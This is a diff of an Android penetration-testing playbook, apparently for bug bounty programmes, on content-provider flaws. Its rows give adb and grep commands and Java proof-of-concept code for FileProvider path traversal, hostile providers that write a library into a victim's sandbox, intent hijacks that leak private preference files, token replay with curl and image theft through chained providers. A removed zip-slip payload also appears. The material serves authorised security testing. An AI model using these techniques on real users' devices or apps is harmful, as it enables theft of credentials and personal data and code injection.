 ```bash
-adb shell content read --uri 'content://com.target.app.fileprovider/files/../shared_prefs/com.target.app.xml'
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.fileprovider/files/../shared_prefs/com.target.app.xml'
 # expect: IllegalArgumentException: Failed to find configured root that contains /data/.../shared_prefs/...
-adb shell run-as com.target.app find /data/data/com.target.app/files -type f 2>/dev/null
-adb shell run-as com.target.app find /data/data/com.target.app/cache -type f 2>/dev/null
+adb -s "$SERIAL" shell run-as com.target.app find /data/data/com.target.app/files -type f 2>/dev/null
+adb -s "$SERIAL" shell run-as com.target.app find /data/data/com.target.app/cache -type f 2>/dev/null
 # then read the prize that IS in files/
-adb shell content read --uri 'content://com.target.app.fileprovider/files/session_backup.json'
+adb -s "$SERIAL" shell content read --uri 'content://com.target.app.fileprovider/files/session_backup.json'
 ```
 - **Proof:** Two artefacts: the traversal attempt failing with the exact `Failed to find configured root`
   exception, **and** a plain file inside `files/` that reads successfully — typically a session backup
@@ -2269,7 +2353,7 @@ adb shell content read --uri 'content://com.target.app.fileprovider/files/sessio
   or the **grant delivery** (D07-024/-022), never the attribute's presence.
 - **How:**
 ```bash
-grep -n -B2 -A6 'androidx.core.content.FileProvider\|android.support.v4.content.FileProvider' out/AndroidManifest.xml
+grep -n -B2 -A6 'androidx.core.content.FileProvider\|android.support.v4.content.FileProvider' "$DEC/apktool/AndroidManifest.xml"
 # confirm the class before judging the attribute
 ```
 - **Proof:** n/a — this is a filter. If the provider class is (or extends) `FileProvider`, drop the
@@ -2283,7 +2367,7 @@ grep -n -B2 -A6 'androidx.core.content.FileProvider\|android.support.v4.content.
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) once execution is shown; `server_security_misconfiguration.path_traversal` (VARIES) for the write |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (P1) once execution is shown; `server_security_misconfiguration.path_traversal` (varies) for the write |
 | **Attacker** | AM-03 (the victim must open/accept the share — one interaction) |
 | **Applies to** | every app with a share target, attachment, file-import or "open with" flow |
 | **Requires** | device |
@@ -2300,11 +2384,16 @@ String filePath = new File(context.getFilesDir(), displayName).getPath();
 FileOutputStream outputStream = new FileOutputStream(filePath);
 ```
 ```bash
-grep -rnE 'OpenableColumns|DISPLAY_NAME|"_display_name"|getColumnIndex\(' out/sources/ -A12 \
+grep -rnE 'OpenableColumns|DISPLAY_NAME|"_display_name"|getColumnIndex\(' "$DEC/jadx/sources/" -A12 \
   | grep -nE 'new File\(|FileOutputStream|copyTo|createNewFile|getCanonicalPath'
-grep -rn 'new File(' out/sources/ | grep -iE 'displayname|fileName|name\)'
+grep -rn 'new File(' "$DEC/jadx/sources/" | grep -iE 'displayname|fileName|name\)'
 ```
-  The attacker provider:
+  Try the stock form first — no custom provider needed: AndroidX `FileProvider` (core 1.3+) echoes the
+  `displayName` query parameter back as `OpenableColumns.DISPLAY_NAME` verbatim, so a `FileProvider`
+  declared in the PoC and a URI minted with `getUriForFile(ctx, auth, file, "<traversal display name>")`
+  (which appends `?displayName=`) is the faster, more convincing hostile provider — the consumer's
+  `DISPLAY_NAME` query returns the traversal string unchanged. Fall back to the custom provider below only
+  when you also need to control the `openFile` bytes per URI. The custom attacker provider:
 ```java
 @Override public Cursor query(Uri uri, String[] p, String s, String[] a, String o) {
     MatrixCursor c = new MatrixCursor(new String[]{OpenableColumns.DISPLAY_NAME, OpenableColumns.SIZE});
@@ -2327,7 +2416,7 @@ Intent i = new Intent(Intent.ACTION_SEND).setType("application/*")
   .addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
 startActivity(i);
 ```
-- **Proof:** `adb shell run-as com.target.app ls -la /data/data/com.target.app/lib-main/` showing your
+- **Proof:** `adb -s "$SERIAL" shell run-as com.target.app ls -la /data/data/com.target.app/lib-main/` showing your
   library in place with your bytes, then the app loading it (a log line from your `JNI_OnLoad`) or crashing
   on next launch. On a release build, prove it by the behaviour change and say which you used.
 - **Escalation:** The Xiaomi chain is the template worth reproducing: (1) write `files/lib/libixiaomifileu.so`;
@@ -2357,8 +2446,8 @@ startActivity(i);
   write direction is D07-062's `DISPLAY_NAME`.
 - **How:**
 ```bash
-grep -rnE 'startActivityForResult\(.*(ACTION_PICK|ACTION_GET_CONTENT|IMAGE_CAPTURE|ACTION_CROP|OPEN_DOCUMENT)' out/sources/
-grep -rn -A25 'onActivityResult' out/sources/ \
+grep -rnE 'startActivityForResult\(.*(ACTION_PICK|ACTION_GET_CONTENT|IMAGE_CAPTURE|ACTION_CROP|OPEN_DOCUMENT)' "$DEC/jadx/sources/"
+grep -rn -A25 'onActivityResult' "$DEC/jadx/sources/" \
   | grep -inE 'openInputStream|FileOutputStream|copy|getExternalCacheDir|getExternalFilesDir'
 ```
   Attacker side — register `android:priority="999"` on the matching filter, relax StrictMode so you are
@@ -2369,11 +2458,13 @@ setResult(RESULT_OK, new Intent().setData(Uri.parse(
     "file:///data/user/0/com.target.app/shared_prefs/secrets.xml")));
 finish();
 ```
-- **Proof:** The victim's secrets landing in a directory your app can read
-  (`/sdcard/Android/data/com.target.app/cache/...` or a public dir), dumped by your PoC with the token
-  visible. Show the pre-state (file absent) and post-state (file present with the victim's content).
+- **Proof:** The victim's secrets landing in a directory your app can read — a shared collection
+  (`Download/`, `Pictures/`); `Android/data/<victim>/` is not readable by another app on Android 11+ —
+  dumped by your PoC with the token visible. Show the pre-state (file absent) and post-state (file present with the victim's content).
 - **Escalation:** -> D11/D13. The write variant of the same interception (returning a provider whose
-  `DISPLAY_NAME` traverses) -> D07-062 -> D17.
+  `DISPLAY_NAME` traverses) -> D07-062 -> D17. The hijack mechanism (winning the `ACTION_PICK`/`GET_CONTENT`
+  resolution) is owned by D05-046 and the consumer's result handling by D08-035; this row owns the
+  `file://`-to-private-file payload — settle the three together with one stub.
 - **Ruled out when:** `onActivityResult` rejects the `file` scheme, resolves the real path via
   `openFileDescriptor` + `/proc/self/fd` `readSymbolicLink` and checks it is under `dataDir`, or writes the
   received data to internal storage only and never to a location another app can read.
@@ -2393,29 +2484,21 @@ finish();
   and copies them locally, the bug usually lives in the *consumer*: it derives the destination from
   `DocumentsContract.getDocumentId(srcUri)` with string operations and hands it to `new File(...)`. An
   attacker provider returns a document id containing encoded traversal. The same shape recurs in archive
-  extraction (`zip slip`).
+  extraction (zip slip), which is owned by D11-047 (import/update path, `ZipPathValidator` opt-out) and
+  D17-056 (into a code-load path) — this row is the provider-supplied document-id variant only.
 - **How:**
 ```bash
-grep -rnE 'DocumentsContract\.(getDocumentId|getTreeDocumentId|buildChildDocumentsUriUsingTree)|takePersistableUriPermission' out/sources/
-grep -rnE 'SAVE_URI_PATHS|EXTRA_STREAM|getClipData\(\)|getParcelableArrayListExtra' out/sources/ -A12 \
+grep -rnE 'DocumentsContract\.(getDocumentId|getTreeDocumentId|buildChildDocumentsUriUsingTree)|takePersistableUriPermission' "$DEC/jadx/sources/"
+grep -rnE 'SAVE_URI_PATHS|EXTRA_STREAM|getClipData\(\)|getParcelableArrayListExtra' "$DEC/jadx/sources/" -A12 \
   | grep -inE 'mkdirs|new File\(|FileOutputStream|openInputStream'
-grep -rnE 'ZipInputStream|ZipFile\.entries|getNextEntry|TarArchiveInputStream' out/sources/
-grep -rn 'getCanonicalPath' out/sources/     # absence is the finding
+grep -rnE 'ZipInputStream|ZipFile\.entries|getNextEntry|TarArchiveInputStream' "$DEC/jadx/sources/"
+grep -rn 'getCanonicalPath' "$DEC/jadx/sources/"     # absence is the finding
 ```
   Serve an attacker provider whose document id encodes traversal
-  (`data%2F..%2Fpayload.apk` -> `data/../payload.apk`), or build the archive form:
-```bash
-python3 - <<'PY'
-import zipfile
-z = zipfile.ZipFile('evil.zip','w')
-z.writestr('../../../../data/data/com.target.app/files/libpwn.so', open('libpwn.so','rb').read())
-z.close()
-PY
-adb push evil.zip /sdcard/ && adb shell am start -a android.intent.action.VIEW \
-  -d 'file:///sdcard/evil.zip' -t application/zip -n com.target.app/.ImportActivity
-```
+  (`data%2F..%2Fpayload.apk` -> `data/../payload.apk`). The archive form (a crafted zip entry name) is run
+  under D11-047 / D17-056; record its outcome there and cross-reference it here.
 - **Proof:** A file you supplied appearing outside the intended directory inside the victim's sandbox:
-  `adb shell run-as com.target.app ls -l <escaped path>` with your bytes.
+  `adb -s "$SERIAL" shell run-as com.target.app ls -l <escaped path>` with your bytes.
 - **Escalation:** -> D17 when the overwritten file is a cached plugin, a downloaded APK, a `.dex`/`.jar` or
   a restore target the app later loads. Android 14 (targetSdk 34) adds `ZipPathValidator` for the **zip**
   variant only — it does nothing for provider-supplied document ids, so state which variant you exploited.
@@ -2429,7 +2512,7 @@ adb push evil.zip /sdcard/ && adb shell am start -a android.intent.action.VIEW \
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | all — **including providers declared `exported="false"`** |
 | **Requires** | provider, device |
@@ -2441,12 +2524,12 @@ adb push evil.zip /sdcard/ && adb shell am start -a android.intent.action.VIEW \
   and it usually lands data somewhere world-readable as a bonus.
 - **How:**
 ```bash
-grep -rn -A40 'public Cursor query(\|public Bundle call(\|public Uri insert(\|public ParcelFileDescriptor openFile(' out/sources/ \
+grep -rn -A40 'public Cursor query(\|public Bundle call(\|public Uri insert(\|public ParcelFileDescriptor openFile(' "$DEC/jadx/sources/" \
   | grep -inE 'FileOutputStream|transferTo|Environment\.DIRECTORY_|getDatabasePath|Runtime\.exec|ProcessBuilder|Cipher|deleteDatabase|SharedPreferences\.Editor'
 # find the UriMatcher arm that reaches it, then fire it
-adb shell content query --uri content://com.target.app.internal/debug
-adb shell content call  --uri content://com.target.app.internal --method exportDatabase
-adb shell ls -la /sdcard/Download /sdcard/Android/data/com.target.app/files
+adb -s "$SERIAL" shell content query --uri content://com.target.app.internal/debug
+adb -s "$SERIAL" shell content call  --uri content://com.target.app.internal --method exportDatabase
+adb -s "$SERIAL" shell ls -la /sdcard/Download /sdcard/Android/data/com.target.app/files
 ```
 - **Proof:** The side-effect artefact appearing (a database copy in `Downloads`, a log file, a re-issued
   token) and you reading it. Show the directory listing before and after.
@@ -2462,7 +2545,7 @@ adb shell ls -la /sdcard/Download /sdcard/Android/data/com.target.app/files
 | | |
 |---|---|
 | **Severity ceiling** | Medium |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
 | **Attacker** | AM-03/AM-04 (needs slice permission, or be a slice host) |
 | **Applies to** | apps shipping AndroidX Slices |
 | **Requires** | provider |
@@ -2475,10 +2558,10 @@ adb shell ls -la /sdcard/Download /sdcard/Android/data/com.target.app/files
   app's own hosts. Declining in prevalence, so almost never reviewed.
 - **How:**
 ```bash
-grep -nB2 -A10 'android.app.slice.category.SLICE' out/AndroidManifest.xml
-grep -rnE 'extends SliceProvider|onBindSlice|onCreateSliceProvider|onMapIntentToUri|grantSlicePermission|checkSlicePermission' out/sources/
-adb shell content query --uri 'content://com.target.app/hello'
-adb shell content query --uri 'content://com.target.app/account/balance'
+grep -nB2 -A10 'android.app.slice.category.SLICE' "$DEC/apktool/AndroidManifest.xml"
+grep -rnE 'extends SliceProvider|onBindSlice|onCreateSliceProvider|onMapIntentToUri|grantSlicePermission|checkSlicePermission' "$DEC/jadx/sources/"
+adb -s "$SERIAL" shell content query --uri 'content://com.target.app/hello'
+adb -s "$SERIAL" shell content query --uri 'content://com.target.app/account/balance'
 ```
 - **Proof:** Non-idempotent behaviour observable from a bind — a request appearing in the proxy log, a file
   written, or account data returned in the slice's row titles and subtitles.
@@ -2492,7 +2575,7 @@ adb shell content query --uri 'content://com.target.app/account/balance'
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | apps implementing or consuming a cloud media provider |
 | **Requires** | provider |
@@ -2504,9 +2587,9 @@ adb shell content query --uri 'content://com.target.app/account/balance'
   semantics from local files.
 - **How:**
 ```bash
-grep -rnE 'CloudMediaProvider|cloud_media|android.content.action.CLOUD_MEDIA' out/sources/ out/AndroidManifest.xml
-adb shell content query --uri 'content://com.target.app.cloudmedia/media'
-adb shell dumpsys package com.target.app | grep -i cloud
+grep -rnE 'CloudMediaProvider|cloud_media|android.content.action.CLOUD_MEDIA' "$DEC/jadx/sources/" "$DEC/apktool/AndroidManifest.xml"
+adb -s "$SERIAL" shell content query --uri 'content://com.target.app.cloudmedia/media'
+adb -s "$SERIAL" shell dumpsys package com.target.app | grep -i cloud
 ```
 - **Proof:** A `CloudMediaProvider` subclass returning items without verifying the requesting selection
   context — i.e. media outside the user's current selection returned to a caller.
@@ -2514,7 +2597,7 @@ adb shell dumpsys package com.target.app | grep -i cloud
 - **Ruled out when:** No `CloudMediaProvider` subclass and no `CLOUD_MEDIA` action in the manifest. Related
   and worth one command while you are here: an app that requests `READ_MEDIA_IMAGES`/`_VIDEO`/`_AUDIO` and
   enumerates `MediaStore` instead of using the picker (which needs **no** permission) is over-collecting —
-  `adb shell pm revoke com.target.app android.permission.READ_MEDIA_IMAGES` and see whether the feature
+  `adb -s "$SERIAL" shell pm revoke com.target.app android.permission.READ_MEDIA_IMAGES` and see whether the feature
   still works through the picker.
 
 ### D07-068 · Rate the provider by what the rows contain, not by the fact it is exported
@@ -2522,7 +2605,7 @@ adb shell dumpsys package com.target.app | grep -i cloud
 | | |
 |---|---|
 | **Severity ceiling** | Critical |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a live backend credential; `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) for another user's records; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) otherwise |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) for a live backend credential; `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) for another user's records; `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) otherwise |
 | **Attacker** | AM-03 |
 | **Applies to** | all |
 | **Requires** | provider, device |
@@ -2538,7 +2621,7 @@ adb shell dumpsys package com.target.app | grep -i cloud
 for P in $(cat /tmp/reachable_paths.txt); do
   echo "=== $P"
   drozer> run app.provider.columns "content://$P"
-  adb shell content query --uri "content://$P" --projection "*" | head -5
+  adb -s "$SERIAL" shell "content query --uri \"content://$P\" --projection \"*\"" | head -5
 done
 # the GUI route that proves any third-party app can do it with no adb:
 #   Content Provider Helper (com.jensdriller.contentproviderhelper)
@@ -2559,7 +2642,7 @@ done
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES) |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies) |
 | **Attacker** | AM-03 |
 | **Applies to** | apps with both a metadata provider and a file/thumbnail/cache provider |
 | **Requires** | provider, device |
@@ -2571,13 +2654,13 @@ done
 - **How:**
 ```bash
 # step 1: leak the filenames from the metadata provider
-adb shell content query --uri content://org.nextcloud/file --projection "filename,path,has_preview"
+adb -s "$SERIAL" shell "content query --uri content://org.nextcloud/file --projection \"filename,path,has_preview\""
 # -> filename=1553357105332.jpg, path=/1553357105332.jpg, has_preview=1
 # step 2: feed the name to the thumbnail/cache provider
-adb shell content read --uri content://org.nextcloud.imageCache.provider/1553357105332.jpg > stolen.jpg
+adb -s "$SERIAL" shell content read --uri content://org.nextcloud.imageCache.provider/1553357105332.jpg > stolen.jpg
 file stolen.jpg
 # find the pairs systematically
-grep -rn 'android:authorities' out/AndroidManifest.xml | grep -iE 'cache|image|thumb|preview|media|file'
+grep -rn 'android:authorities' "$DEC/apktool/AndroidManifest.xml" | grep -iE 'cache|image|thumb|preview|media|file'
 ```
 - **Proof:** `stolen.jpg` opening as the victim's actual image, obtained by an app holding no storage
   permission. Show both steps and the resulting file.
@@ -2606,8 +2689,8 @@ grep -rn 'android:authorities' out/AndroidManifest.xml | grep -iE 'cache|image|t
 - **How:**
 ```bash
 # 1. inventory identifiers and hosts from the provider rows
-adb shell content query --uri content://com.target.app.provider/session --projection "*"
-adb shell content query --uri content://com.target.app.provider/config  --projection "*"
+adb -s "$SERIAL" shell "content query --uri content://com.target.app.provider/session --projection \"*\""
+adb -s "$SERIAL" shell "content query --uri content://com.target.app.provider/config  --projection \"*\""
 # 2. does the token work off-device, with no app?
 curl -s -o /dev/null -w '%{http_code}\n' -H "Authorization: Bearer $TOKEN" https://api.target.example/v1/me
 # 3. behavioural version diff for the SAME operation
@@ -2640,7 +2723,7 @@ curl -s -o /dev/null -w '%{http_code}\n' "https://target.example/index.php/s/rkN
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (VARIES); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the signed URL is replayable by anyone |
+| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pii_leakage_exposure` (varies); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) if the signed URL is replayable by anyone |
 | **Attacker** | AM-03 |
 | **Applies to** | apps using `DownloadManager` |
 | **Requires** | device |
@@ -2652,12 +2735,12 @@ curl -s -o /dev/null -w '%{http_code}\n' "https://target.example/index.php/s/rkN
   `Authorization` header to the download, which is how signed URLs end up in a world-readable row.
 - **How:**
 ```bash
-grep -rnE 'DownloadManager|setDestinationInExternalPublicDir|setDestinationUri|addRequestHeader|setVisibleInDownloadsUi|allowScanningByMediaScanner' out/sources/
+grep -rnE 'DownloadManager|setDestinationInExternalPublicDir|setDestinationUri|addRequestHeader|setVisibleInDownloadsUi|allowScanningByMediaScanner' "$DEC/jadx/sources/"
 # after downloading an in-app document (invoice, statement, KYC copy, chat attachment):
-adb shell ls -la /sdcard/Download/
-adb shell content query --uri content://downloads/my_downloads \
-  --projection "_id,uri,local_uri,title,status,notificationpackage"
-adb shell content query --uri content://downloads/all_downloads
+adb -s "$SERIAL" shell ls -la /sdcard/Download/
+adb -s "$SERIAL" shell "content query --uri content://downloads/my_downloads \
+  --projection \"_id,uri,local_uri,title,status,notificationpackage\""
+adb -s "$SERIAL" shell content query --uri content://downloads/all_downloads
 ```
 - **Proof:** Either `ls -la` showing a per-user document readable outside the sandbox, **or** a
   `content://downloads/my_downloads` row whose `uri` contains `?token=`/`?sig=`/`X-Amz-Signature` that still
@@ -2673,7 +2756,7 @@ adb shell content query --uri content://downloads/all_downloads
 | | |
 |---|---|
 | **Severity ceiling** | High |
-| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (VARIES) |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
 | **Attacker** | AM-03/AM-04 |
 | **Applies to** | Scoped storage from Android 10 (API 29); `requestLegacyExternalStorage` ignored at targetSdk 30+; `READ_EXTERNAL_STORAGE` has no effect from Android 13 (API 33); `OWNER_PACKAGE_NAME` redaction from Android 14 |
 | **Requires** | device |
@@ -2686,10 +2769,10 @@ adb shell content query --uri content://downloads/all_downloads
   fails open on attacker-supplied media.
 - **How:**
 ```bash
-grep -nE 'MANAGE_EXTERNAL_STORAGE|READ_MEDIA_IMAGES|READ_MEDIA_VIDEO|READ_MEDIA_AUDIO|READ_MEDIA_VISUAL_USER_SELECTED' out/AndroidManifest.xml
-grep -rn 'OWNER_PACKAGE_NAME' out/sources/
-adb shell content query --uri content://media/external_primary/images/media
-adb shell content query --uri content://media/external_primary/file
+grep -nE 'MANAGE_EXTERNAL_STORAGE|READ_MEDIA_IMAGES|READ_MEDIA_VIDEO|READ_MEDIA_AUDIO|READ_MEDIA_VISUAL_USER_SELECTED' "$DEC/apktool/AndroidManifest.xml"
+grep -rn 'OWNER_PACKAGE_NAME' "$DEC/jadx/sources/"
+adb -s "$SERIAL" shell content query --uri content://media/external_primary/images/media
+adb -s "$SERIAL" shell content query --uri content://media/external_primary/file
 # then place a file from a third app and observe which branch the target takes
 ```
 - **Proof:** For (a): the **absence** of
@@ -2703,31 +2786,33 @@ adb shell content query --uri content://media/external_primary/file
   `no access` SecurityException), does not hold `MANAGE_EXTERNAL_STORAGE`, and makes no authorisation
   decision on `OWNER_PACKAGE_NAME`.
 
-### D07-073 · `androidx.startup` authority collision — HYPOTHESIS, run the experiment before reporting
+### D07-073 · `androidx.startup` and other fixed-authority providers — install-time authority collision (documented, low impact)
 
 | | |
 |---|---|
 | **Severity ceiling** | Low |
-| **VRT** | `application_level_denial_of_service_dos` (VARIES) — availability only, and **only if the experiment confirms it**; see the doctrine note below |
+| **VRT** | `application_level_denial_of_service_dos` (varies) — availability only; see the doctrine note below |
 | **Attacker** | AM-03 |
 | **Applies to** | apps using AndroidX App Startup or any fixed-authority initialiser |
 | **Requires** | provider, device |
-| **Maps to** | `topic/libraries/app-startup` (authority format `${applicationId}.androidx-startup`, `android:exported="false"`). **The collision behaviour itself is unverified — do not report it as fact without running the experiment.** |
+| **Maps to** | `topic/libraries/app-startup` (authority format `${applicationId}.androidx-startup`, `android:exported="false"`); `PackageManager.INSTALL_FAILED_CONFLICTING_PROVIDER` — the installer refuses a package whose authority is already registered ("Can't install because provider name X (in package Y) is already used by Z"). Documented; the experiment is for the evidence line, not for the fact. |
 
 - **Test:** Android refuses to install a package whose provider authority is already claimed by an installed
-  package. **Hypothesis:** an attacker app that pre-registers `com.target.app.androidx-startup` prevents the
-  legitimate app from installing (a distribution denial, or a forced sideload/downgrade), or is itself
-  rejected if installed second — making this a one-way install DoS rather than a data bug.
+  package (`INSTALL_FAILED_CONFLICTING_PROVIDER`). An attacker app that pre-registers
+  `com.target.app.androidx-startup` prevents the legitimate app from installing (a distribution denial, or a
+  forced sideload/downgrade), or is itself rejected if installed second — a one-way install DoS rather than
+  a data bug. Impact is pre-installation only (the victim app is normally already installed); report only to
+  programmes that buy availability, as Low.
 - **How:**
 ```bash
 # 1. install an attacker app declaring the target's startup authority
 #    <provider android:name=".Stub" android:authorities="com.target.app.androidx-startup"
 #              android:exported="false"/>
-adb install attacker-authority.apk
+adb -s "$SERIAL" install attacker-authority.apk
 # 2. attempt to install the target
-adb install target.apk
+adb -s "$SERIAL" install target.apk
 # 3. observe
-adb shell dumpsys package providers | grep androidx-startup
+adb -s "$SERIAL" shell dumpsys package providers | grep androidx-startup
 ```
   Refuted if step 2 succeeds; confirmed if it fails with a conflicting-provider error.
 - **Proof:** The exact installer output from step 2 (e.g. `INSTALL_FAILED_CONFLICTING_PROVIDER`), plus the
@@ -2853,7 +2938,157 @@ These primitives have independent fix surfaces and are filed separately per the 
   not claim each primitive is independently Critical, and do not ask for a single combined bounty.
 - **Escalation:** Open the severity request in the consumer's first body section, naming the VRT node you
   chose and the priority you are asking for, with the reachability proof as the reasoning.
-- **Ruled out when:** n/a — mechanics.
+- **Ruled out when:** n/a — mechanics; every D07 primitive that feeds another domain is filed in this order.
+
+### D07-077 · Provider probe contract — positive control, full verb matrix, exception text
+
+| | |
+|---|---|
+| **Severity ceiling** | Support |
+| **VRT** | n/a (methodology control) |
+| **Attacker** | AM-03 |
+| **Applies to** | every app-UID provider probe in this chapter (D07-005, D07-010, D07-018, D07-019, D07-078) |
+| **Requires** | device |
+| **Maps to** | MASTG-TECH-0148 (the `content` command runs as `shell`); the D07-006 layer table; `attacker-app/README.md` (`provider` step) |
+| **Record** | logs/D07-077.txt (the full `PROBE` log of one run, control line included); the pulled `files/probe-<session>.log` mirror; inventory/components.csv `notes` |
+
+- **Skip when:** n/a — unconditional for every app-UID provider negative.
+- **Test:** A provider negative is only as good as the probe that produced it. The probe must (1) log
+  `Throwable.toString()` — class **and** message — never `getClass().getSimpleName()`, because the layer
+  classification in D07-006 is made on the message; (2) run the full overridable surface per authority —
+  `query`, `insert`, `update`, `delete`, `bulkInsert`, `applyBatch`, `call` (every name from D07-017),
+  `openFile` r/w, `openAssetFile`, `openTypedAssetFile`, `getType`, `getStreamTypes`, `canonicalize`,
+  `refresh` — not `query` plus a few `call()` names; (3) carry a **positive control**: a known-readable
+  authority is queried first in the same run, so a run with zero positives is proven to be a result and not
+  a dead harness; (4) declare `<queries>` per D07-008; (5) be started with `am start -S` so `onCreate` runs
+  on every launch, with a distinct action per fire in a loop. The shared probe app does all five; a
+  per-engagement rewrite that drops one of them manufactures false negatives for the whole domain.
+- **How:** Use the shared probe (`attacker-app/`, `provider` step); if it lacks a verb, add it there rather
+  than building a per-engagement copy.
+```bash
+adb -s "$SERIAL" shell am start -S -n com.sanehunters.probe/.MainActivity --es run provider --es victim "$PKG" \
+  --es authority "$AUTH" --es methods "<call() names from D07-017>"      # verbs default to all 18
+adb -s "$SERIAL" logcat -d -s PROBE:V | tee logs/D07-077.txt
+adb -s "$SERIAL" pull /sdcard/Android/data/com.sanehunters.probe/files/ logs/probe/   # the file mirror; some builds drop app Log.i
+grep -c 'POSITIVE CONTROL' logs/D07-077.txt     # must be 1 — otherwise every zero in the run is UNVERIFIED
+```
+- **Proof:** The control authority returning rows in the same log as the target results; one line per
+  authority per verb with the full exception text (`java.lang.SecurityException: Permission Denial: ...`),
+  and the `ready` line showing `requestedPermissions=[]`.
+- **Escalation:** Feeds the D07-005 / D07-010 / D07-018 / D07-019 tables; a verb that returns a value where
+  `query` was denied reopens the authority (D07-015, D07-018).
+- **Ruled out when:** n/a — unconditional. A provider negative recorded from a probe without a positive
+  control, or without the exception message, is an unfinished test, not a ruled-out row.
+
+### D07-078 · `getType()` reaches non-exported providers through the system-server MIME path
+
+| | |
+|---|---|
+| **Severity ceiling** | High |
+| **VRT** | `broken_access_control.exposed_sensitive_android_intent` (varies) |
+| **Attacker** | AM-03 |
+| **Applies to** | every provider, exported or not, whose `getType()` or `getTypeAnonymous()` override does more than return a constant |
+| **Requires** | provider, device |
+| **Maps to** | MASTG-TECH-0148; AOSP `ContentProvider.getTypeAnonymous()` javadoc (API 34: "does not need to be permission protected") |
+| **Record** | logs/D07-078.txt (probe log for the oldest and the newest API in the lab, with the API level in the header) |
+
+- **Skip when:** `grep -rnE 'String (getType|getTypeAnonymous)\(' "$DEC/jadx/sources"` shows no override outside framework packages → notes: "no provider overrides getType/getTypeAnonymous (grep count 0)".
+- **Test:** When the caller cannot acquire the provider, `ContentResolver.getType()` asks the system server,
+  which resolves the MIME type with system identity. On Android 13 and below that executes the provider's
+  own `getType(uri)` for any caller — exported or not, no permission. From Android 14 the unpermitted path
+  is routed to `getTypeAnonymous(uri)` (framework default `null`) and only permitted callers reach
+  `getType()`. An override that performs a path or database lookup is therefore a row-existence oracle and
+  a code path that executes inside a non-exported provider: on API <= 33 (inside most `minSdk` ranges)
+  always, on 14+ wherever `getTypeAnonymous` is overridden.
+- **How:**
+```bash
+grep -rnE 'public String (getType|getTypeAnonymous)\(' "$DEC/jadx/sources" -A15
+```
+  From the probe (zero permissions; this path needs no `<queries>` entry — note whether one was declared
+  anyway), run the `getType` verb against an id that exists, an id that does not, and a nonsense path, on
+  the lowest API image inside `minSdk` and on the newest:
+```bash
+adb -s "$SERIAL" shell am start -S -n com.sanehunters.probe/.MainActivity --es run provider --es victim "$PKG" \
+  --es authority "$AUTH" --es verbs getType --es paths "/items/1,/items/999999,/nonexistent"
+adb -s "$SERIAL" logcat -d -s PROBE:V | grep 'verb=getType' | tee -a logs/D07-078.txt
+```
+- **Proof:** A non-null MIME string (or a differing exception) returned for a provider whose `query()` on
+  the same URI throws `Permission Denial`/`not exported`, plus a differing answer for an existing versus a
+  non-existing id — on a stated API level.
+- **Escalation:** ids confirmed real -> D15 (server object enumeration); a `getType` that opens files or a
+  database on the way -> D07-065.
+- **Ruled out when:** Every override returns a constant (quote it, file:line) and the probe gets `null` for
+  every URI on the oldest API inside `minSdk` — a result from the newest image alone does not close the
+  API <= 33 path.
+
+### D07-079 · `Bundle`-form `query()`/`insert()`/`update()`/`delete()` — the SQL sinks the CLI cannot send
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical |
+| **VRT** | `server_side_injection.sql_injection` (P1) |
+| **Attacker** | AM-03 |
+| **Applies to** | providers overriding `query(Uri, String[], Bundle, CancellationSignal)` (API 26+) or `insert/update/delete(..., Bundle)` (API 30+) |
+| **Requires** | provider, device |
+| **Maps to** | MASTG-TEST-0339, MASTG-TECH-0148, MASTG-BEST-0039 |
+| **Record** | logs/D07-079.txt (probe log with the Bundle keys sent and the parser error or row-count pair) |
+
+- **Skip when:** the grep below is empty → notes: "no Bundle-form provider override (grep count 0); the legacy signatures are covered by D07-038..042".
+- **Test:** `ContentResolver.query(uri, projection, queryArgs, signal)` carries `QUERY_ARG_SQL_SELECTION`,
+  `QUERY_ARG_SQL_SELECTION_ARGS`, `QUERY_ARG_SQL_SORT_ORDER`, `QUERY_ARG_SQL_GROUP_BY`, `QUERY_ARG_SQL_HAVING`
+  and `QUERY_ARG_SQL_LIMIT`. The framework's default Bundle-form `query()` forwards only selection, args and
+  sort order to the legacy signature, but a provider that overrides the Bundle form reads GROUP BY, HAVING
+  and LIMIT and splices them into `SQLiteQueryBuilder.query(...)` or a raw string. `adb -s "$SERIAL" shell content` has
+  no flag for any of them, so a full CLI sweep (D07-038..042) says nothing about these three sinks, and the
+  write overloads with a `Bundle extras` argument are a fourth path the CLI never exercises.
+- **How:**
+```bash
